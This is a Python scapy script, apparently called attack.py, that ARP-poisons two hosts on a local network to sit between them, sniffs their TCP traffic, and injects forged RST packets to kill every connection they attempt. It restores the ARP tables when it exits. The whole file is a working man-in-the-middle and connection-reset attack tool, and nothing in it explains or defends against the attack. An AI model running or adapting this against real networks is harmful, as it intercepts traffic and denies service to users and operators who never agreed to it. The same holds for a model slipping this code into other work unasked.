#!/usr/bin/env python3
import os
import threading
import time
import signal
import sys
from scapy.all import (
    sniff, sendp, Ether, IP, TCP,
    ARP, getmacbyip, get_if_hwaddr, conf
)

# ------------------------------------------------------------------
# CONFIGURATION
# ------------------------------------------------------------------
INTERFACE = "eth0"
SRC = "10.0.2.10"
DST = "10.0.2.20"
POISON_INTERVAL = 2   # seconds between ARP poison packets

# Map TCP flag bits to names
FLAG_MEANINGS = {
    'F': 'FIN', 'S': 'SYN', 'R': 'RST', 'P': 'PSH',
    'A': 'ACK', 'U': 'URG', 'E': 'ECE', 'C': 'CWR',
}

# Storage
ip_to_mac = {}
stop_poison = threading.Event()

# ------------------------------------------------------------------
# ARP SPOOF ROUTINES
# ------------------------------------------------------------------
def arp_poison(mac_attacker, ip_victim, mac_victim, ip_spoof):
    pkt = ARP(op=2, hwsrc=mac_attacker, psrc=ip_spoof,
              hwdst=mac_victim, pdst=ip_victim)
    sendp(Ether(dst=mac_victim)/pkt, iface=INTERFACE, verbose=0)

def poison_loop(mac_attacker, mac_src, mac_dst):
    print(f"[+] ARP poisoning {SRC}<->{DST} via {INTERFACE}")
    while not stop_poison.is_set():
        arp_poison(mac_attacker, SRC, mac_src, DST)
        arp_poison(mac_attacker, DST, mac_dst, SRC)
        time.sleep(POISON_INTERVAL)

def restore_arp(mac_src, mac_dst):
    print("[*] Restoring ARP tables...")
    for _ in range(3):
        pkt1 = ARP(op=2, hwsrc=mac_dst, psrc=DST,
                   hwdst="ff:ff:ff:ff:ff:ff", pdst=SRC)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/pkt1,
              iface=INTERFACE, verbose=0)
        pkt2 = ARP(op=2, hwsrc=mac_src, psrc=SRC,
                   hwdst="ff:ff:ff:ff:ff:ff", pdst=DST)
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/pkt2,
              iface=INTERFACE, verbose=0)
        time.sleep(1)
    print("[*] ARP restored. Exiting.")

# ------------------------------------------------------------------
# TCP-RST ATTACK LOGIC
# ------------------------------------------------------------------
def get_direction(src, dst):
    if src == SRC and dst == DST:
        return f"{SRC} → {DST}"
    elif src == DST and dst == SRC:
        return f"{DST} → {SRC}"
    return "other"

def parse_flags(flags):
    return [FLAG_MEANINGS.get(f, f) for f in str(flags)]

def send_layer2_packet(src_ip, src_port, dst_ip, dst_port, flags, seq, ack):
    if src_ip not in ip_to_mac or dst_ip not in ip_to_mac:
        print(f"[!] Missing MAC for {src_ip} or {dst_ip}")
        return
    ether = Ether(src=ip_to_mac[src_ip], dst=ip_to_mac[dst_ip])
    ip = IP(src=src_ip, dst=dst_ip)
    tcp = TCP(sport=src_port, dport=dst_port,
              flags=flags, seq=seq, ack=ack)
    sendp(ether/ip/tcp, iface=INTERFACE, verbose=0)
    print(f"[>] Sent {flags} {src_ip}:{src_port}→{dst_ip}:{dst_port}")

def send_rst(src_ip, src_port, dst_ip, dst_port, seq, ack):
    send_layer2_packet(src_ip, src_port, dst_ip, dst_port, "RA", seq, ack)

def packet_handler(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(TCP):
        ip = pkt[IP]; tcp = pkt[TCP]
        if ip.src not in ip_to_mac:
            ip_to_mac[ip.src] = pkt.src
        if ip.dst not in ip_to_mac:
            ip_to_mac[ip.dst] = pkt.dst
        if {ip.src, ip.dst} == {SRC, DST}:
            flags = set(parse_flags(tcp.flags))
            payload = len(tcp.payload)
            print(f"[=] {get_direction(ip.src,ip.dst)} Flags={flags} "
                  f"SEQ={tcp.seq} ACK={tcp.ack} LEN={payload}")
            if flags == {"SYN"}:
                send_rst(SRC, tcp.dport, DST, tcp.sport, 0, tcp.seq+1)
            elif flags == {"SYN","ACK"}:
                send_rst(SRC, tcp.dport, DST, tcp.sport, tcp.ack, tcp.seq+1)
            elif flags in ({"ACK"}, {"PSH","ACK"}):
                send_rst(SRC, tcp.dport, DST, tcp.sport,
                         tcp.ack, tcp.seq+payload)
            elif flags == {"FIN","ACK"}:
                send_rst(SRC, tcp.dport, DST, tcp.sport, tcp.ack, tcp.seq+1)
            else:
                print(f"[!] Unhandled flags: {flags}")

# ------------------------------------------------------------------
# MAIN
# ------------------------------------------------------------------
def main():
    if os.geteuid() != 0:
        print("Run as root: sudo python3 attack.py"); sys.exit(1)

    # Resolve MACs via ARP
    mac_src = getmacbyip(SRC)
    mac_dst = getmacbyip(DST)
    if not mac_src or not mac_dst:
        print("[!] ARP resolution failed for SRC or DST"); sys.exit(1)
    print(f"[+] SRC {SRC} → {mac_src}, DST {DST} → {mac_dst}")

    mac_att = get_if_hwaddr(INTERFACE)
    print(f"[+] Attacker MAC on {INTERFACE}: {mac_att}")

    # Start ARP poison thread
    t = threading.Thread(target=poison_loop,
                         args=(mac_att, mac_src, mac_dst),
                         daemon=True)
    t.start()

    # On exit, restore ARP
    def cleanup(sig, frame):
        stop_poison.set()
        restore_arp(mac_src, mac_dst)
        sys.exit(0)
    signal.signal(signal.SIGINT, cleanup)
    signal.signal(signal.SIGTERM, cleanup)

    print(f"[+] Sniffing TCP between {SRC} and {DST} on {INTERFACE}")
    sniff(iface=INTERFACE,
          filter=f"tcp and (host {SRC} or host {DST})",
          prn=packet_handler, store=False)

if __name__ == "__main__":
    main()
